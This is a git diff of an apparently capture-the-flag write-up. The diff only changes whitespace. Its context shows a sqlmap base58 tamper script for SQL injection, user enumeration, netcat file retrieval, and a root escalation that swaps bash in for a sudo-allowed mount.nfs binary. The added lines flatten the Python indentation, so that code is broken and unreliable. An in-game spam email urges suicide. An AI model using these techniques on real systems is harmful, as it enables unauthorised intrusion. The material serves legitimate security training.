@@ -5,8 +5,8 @@
 
 | PORT | SERVICE |
 | :--- | :------ |
-| 80   | HTTP    |
-| 4346 | HTTP    |
+| 80 | HTTP |
+| 4346 | HTTP |
 
 
 
@@ -125,14 +125,14 @@ import base58
 __priority__ = PRIORITY.HIGHEST
 
 def tamper(payload, **kwargs):
-    """
-    Encode the payload with base58 :)
-    """
-    if payload:
-        prefixed_payload = f"booking_id:{payload}"
-        encoded_payload = base58.b58encode(prefixed_payload.encode()).decode()
-        return encoded_payload
-    return payload
+ """
+ Encode the payload with base58 :)
+ """
+ if payload:
+ prefixed_payload = f"booking_id:{payload}"
+ encoded_payload = base58.b58encode(prefixed_payload.encode()).decode()
+ return encoded_payload
+ return payload
 ```
 
 Now, we need to create a tamper.py file with those contents and an `__init__.py` file too, once we do it, we can send the following `sqlmap` command:
@@ -174,17 +174,17 @@ There's a `js` script embedded, let's beautify it:
 ```js
 let elems = document.querySelectorAll(".email_list .row");
 for (var i = 0; i < elems.length; i++) {
-    elems[i].addEventListener("click", (e => {
-        document.querySelector(".email_list .selected").classList.remove("selected"), e.target.parentElement.classList.add("selected");
-        let t = e.target.parentElement.getAttribute("data-id"),
-            n = e.target.parentElement.querySelector(".col_from").innerText,
-            r = e.target.parentElement.querySelector(".col_subject").innerText;
-        document.querySelector("#from_header").innerText = n, document.querySelector("#subj_header").innerText = r, document.querySelector("#email_content").innerText = "", fetch("/api/message?message_id=" + t).then((e => e.text())).then((e => {
-            document.querySelector("#email_content").innerText = atob(e)
-        }))
-    })), document.querySelector(".dialog_controls button").addEventListener("click", (e => {
-        e.preventDefault(), window.location.href = "/"
-    }))
+ elems[i].addEventListener("click", (e => {
+ document.querySelector(".email_list .selected").classList.remove("selected"), e.target.parentElement.classList.add("selected");
+ let t = e.target.parentElement.getAttribute("data-id"),
+ n = e.target.parentElement.querySelector(".col_from").innerText,
+ r = e.target.parentElement.querySelector(".col_subject").innerText;
+ document.querySelector("#from_header").innerText = n, document.querySelector("#subj_header").innerText = r, document.querySelector("#email_content").innerText = "", fetch("/api/message?message_id=" + t).then((e => e.text())).then((e => {
+ document.querySelector("#email_content").innerText = atob(e)
+ }))
+ })), document.querySelector(".dialog_controls button").addEventListener("click", (e => {
+ e.preventDefault(), window.location.href = "/"
+ }))
 }
 const wsUri = `ws://${location.host}/ws`;
 socket = new WebSocket(wsUri);
@@ -216,13 +216,13 @@ Subject: SPAM: Tired of life?
 
 Hello Friend,
 
-Has life become too impersonal, too tedius, too painful for you?  Then now is
+Has life become too impersonal, too tedius, too painful for you? Then now is
 the time to exert control, to make that decision which is ultimately the only
 real choice we ever have: the decision to die.
 
 Some may describe this as an act of selfishness, but with the dwindling
 reserves of natural resources throughout the world you're actually
-contributing to the well-being of all those around you.  A recent bill passed
+contributing to the well-being of all those around you. A recent bill passed
 by the United States Congress even authorizes a one-time payment of c10,000 to
 your chosen benefactor upon passing away.
 
@@ -244,7 +244,7 @@ Subject: Settled in yet?
 Hey JC,
 
 Thought I'd help you unload your boxes, but I'm tied down trying to get one of
-the medical analyzers working.  Damn thing nearly lasered off one of my fingers!
+the medical analyzers working. Damn thing nearly lasered off one of my fingers!
 Catch you later for a beer maybe?
 
 Oh, and here's a flag: thm{adb5b797ee0d01a8c052dbee46fbc065e8c52afd}
@@ -269,7 +269,7 @@ Message as follows:
 
 >I'm definitely worried about the test results; there are
 >some implications there that I'm afraid to pursue too
->much further.  I'll talk to Tracer.  Proceed with caution.
+>much further. I'll talk to Tracer. Proceed with caution.
 >
 >-P
 ```
@@ -281,7 +281,7 @@ Subject: Account Verification
 
 Mr. Denton:
 
-We've recieved your order for "Blue Harvest" and "See You Next Wednesday."  At
+We've recieved your order for "Blue Harvest" and "See You Next Wednesday." At
 your earliest possible convenience, please remit c110 at which point they will
 be shipped immediately.
 
@@ -385,11 +385,11 @@ jojo:x:1003:1003::/home/jojo:/bin/sh
 
 gilbert@tonhotel:/home$ ls -la
 total 20
-drwxr-xr-x  5 root    root    4096 Sep 10  2023 .
-drwxr-xr-x 19 root    root    4096 Oct 22  2022 ..
-drwxr-xr-x  2 gilbert gilbert 4096 Sep 10  2023 gilbert
-drwxr-xr-x  2 jojo    jojo    4096 Sep 10  2023 jojo
-drwxr-xr-x  3 sandra  sandra  4096 Sep 10  2023 sandra
+drwxr-xr-x 5 root root 4096 Sep 10 2023 .
+drwxr-xr-x 19 root root 4096 Oct 22 2022 ..
+drwxr-xr-x 2 gilbert gilbert 4096 Sep 10 2023 gilbert
+drwxr-xr-x 2 jojo jojo 4096 Sep 10 2023 jojo
+drwxr-xr-x 3 sandra sandra 4096 Sep 10 2023 sandra
 ```
 
 We got some users:
@@ -397,34 +397,34 @@ We got some users:
 ```
 gilbert@tonhotel:/home$ ls -la jojo
 total 24
-drwxr-xr-x 2 jojo jojo 4096 Sep 10  2023 .
-drwxr-xr-x 5 root root 4096 Sep 10  2023 ..
-lrwxrwxrwx 1 jojo jojo    9 Sep 10  2023 .bash_history -> /dev/null
--rw-r--r-- 1 jojo jojo  220 Feb 25  2020 .bash_logout
--rw-r--r-- 1 jojo jojo 3771 Feb 25  2020 .bashrc
--rw-rw---- 1 jojo jojo  223 Sep 10  2023 note.txt
--rw-r--r-- 1 jojo jojo  807 Feb 25  2020 .profile
+drwxr-xr-x 2 jojo jojo 4096 Sep 10 2023 .
+drwxr-xr-x 5 root root 4096 Sep 10 2023 ..
+lrwxrwxrwx 1 jojo jojo 9 Sep 10 2023 .bash_history -> /dev/null
+-rw-r--r-- 1 jojo jojo 220 Feb 25 2020 .bash_logout
+-rw-r--r-- 1 jojo jojo 3771 Feb 25 2020 .bashrc
+-rw-rw---- 1 jojo jojo 223 Sep 10 2023 note.txt
+-rw-r--r-- 1 jojo jojo 807 Feb 25 2020 .profile
 gilbert@tonhotel:/home$ ls -la sandra
 total 32
-drwxr-xr-x 3 sandra sandra 4096 Sep 10  2023 .
-drwxr-xr-x 5 root   root   4096 Sep 10  2023 ..
-lrwxrwxrwx 1 sandra sandra    9 Sep 10  2023 .bash_history -> /dev/null
--rw-r--r-- 1 sandra sandra  220 Feb 25  2020 .bash_logout
--rw-r--r-- 1 sandra sandra 3771 Feb 25  2020 .bashrc
--rw-rw---- 1 sandra sandra  198 Sep 10  2023 note.txt
-drwxrwx--- 2 sandra sandra 4096 Sep 10  2023 Pictures
--rw-r--r-- 1 sandra sandra  807 Feb 25  2020 .profile
--rw-rw---- 1 sandra sandra   46 Sep 10  2023 user.txt
+drwxr-xr-x 3 sandra sandra 4096 Sep 10 2023 .
+drwxr-xr-x 5 root root 4096 Sep 10 2023 ..
+lrwxrwxrwx 1 sandra sandra 9 Sep 10 2023 .bash_history -> /dev/null
+-rw-r--r-- 1 sandra sandra 220 Feb 25 2020 .bash_logout
+-rw-r--r-- 1 sandra sandra 3771 Feb 25 2020 .bashrc
+-rw-rw---- 1 sandra sandra 198 Sep 10 2023 note.txt
+drwxrwx--- 2 sandra sandra 4096 Sep 10 2023 Pictures
+-rw-r--r-- 1 sandra sandra 807 Feb 25 2020 .profile
+-rw-rw---- 1 sandra sandra 46 Sep 10 2023 user.txt
 gilbert@tonhotel:/home$ ls -la gilbert
 total 28
-drwxr-xr-x 2 gilbert gilbert 4096 Sep 10  2023 .
-drwxr-xr-x 5 root    root    4096 Sep 10  2023 ..
-lrwxrwxrwx 1 gilbert gilbert    9 Sep 10  2023 .bash_history -> /dev/null
--rw-r--r-- 1 gilbert gilbert  220 Feb 25  2020 .bash_logout
--rw-r--r-- 1 gilbert gilbert 3771 Feb 25  2020 .bashrc
--rw-r----- 1 sandra  gilbert   31 Sep 10  2023 dad.txt
--rw-rw---- 1 gilbert gilbert  461 Sep 10  2023 hotel-jobs.txt
--rw-r--r-- 1 gilbert gilbert  807 Feb 25  2020 .profile
+drwxr-xr-x 2 gilbert gilbert 4096 Sep 10 2023 .
+drwxr-xr-x 5 root root 4096 Sep 10 2023 ..
+lrwxrwxrwx 1 gilbert gilbert 9 Sep 10 2023 .bash_history -> /dev/null
+-rw-r--r-- 1 gilbert gilbert 220 Feb 25 2020 .bash_logout
+-rw-r--r-- 1 gilbert gilbert 3771 Feb 25 2020 .bashrc
+-rw-r----- 1 sandra gilbert 31 Sep 10 2023 dad.txt
+-rw-rw---- 1 gilbert gilbert 461 Sep 10 2023 hotel-jobs.txt
+-rw-r--r-- 1 gilbert gilbert 807 Feb 25 2020 .profile
 ```
 
 Let's check our notes:
@@ -488,9 +488,9 @@ Let's run `linpeas` again, once we run it, we can find a `boss.jpg` file on the 
 ```
 sandra@tonhotel:/tmp$ ls -la /home/sandra/Pictures/
 total 40
-drwxrwx--- 2 sandra sandra  4096 Sep 10  2023 .
-drwxr-xr-x 5 sandra sandra  4096 Jul  2 23:13 ..
--rw-rw---- 1 sandra sandra 32637 Sep  7  2023 boss.jpg
+drwxrwx--- 2 sandra sandra 4096 Sep 10 2023 .
+drwxr-xr-x 5 sandra sandra 4096 Jul 2 23:13 ..
+-rw-rw---- 1 sandra sandra 32637 Sep 7 2023 boss.jpg
 ```
 
 Let's get it on our machine, we can use netcat for it:
@@ -523,11 +523,11 @@ If we check our sudo permissions, we notice this:
 jojo@tonhotel:/tmp$ sudo -l
 [sudo] password for jojo:
 Matching Defaults entries for jojo on tonhotel:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+ env_reset, mail_badpass,
+ secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
 User jojo may run the following commands on tonhotel:
-    (root) /usr/sbin/mount.nfs
+ (root) /usr/sbin/mount.nfs
 ```
 
 
@@ -585,8 +585,8 @@ If we check `/usr/sbin`, we can now realize it is writable:
 ```
 jojo@tonhotel:/$ ls -la /usr/sbin
 total 4
-drwxrwxrwx  2 nobody nogroup   40 Jul  2 23:49 .
-drwxr-xr-x 14 root   root    4096 Aug 31  2022 ..
+drwxrwxrwx 2 nobody nogroup 40 Jul 2 23:49 .
+drwxr-xr-x 14 root root 4096 Aug 31 2022 ..
 ```
 
 ![Pasted image 20250702190134.png](../../IMAGES/Pasted%20image%2020250702190134.png)
@@ -598,9 +598,9 @@ cp /bin/bash /usr/sbin/mount.nfs
 
 jojo@tonhotel:/$ ls -la /usr/sbin
 total 1160
-drwxrwxrwx  2 nobody nogroup      60 Jul  3 00:01 .
-drwxr-xr-x 14 root   root       4096 Aug 31  2022 ..
--rwxr-xr-x  1 jojo   jojo    1183448 Jul  3 00:01 mount.nfs
+drwxrwxrwx 2 nobody nogroup 60 Jul 3 00:01 .
+drwxr-xr-x 14 root root 4096 Aug 31 2022 ..
+-rwxr-xr-x 1 jojo jojo 1183448 Jul 3 00:01 mount.nfs
 ```
 
 Now, let's use sudo to get our shell:
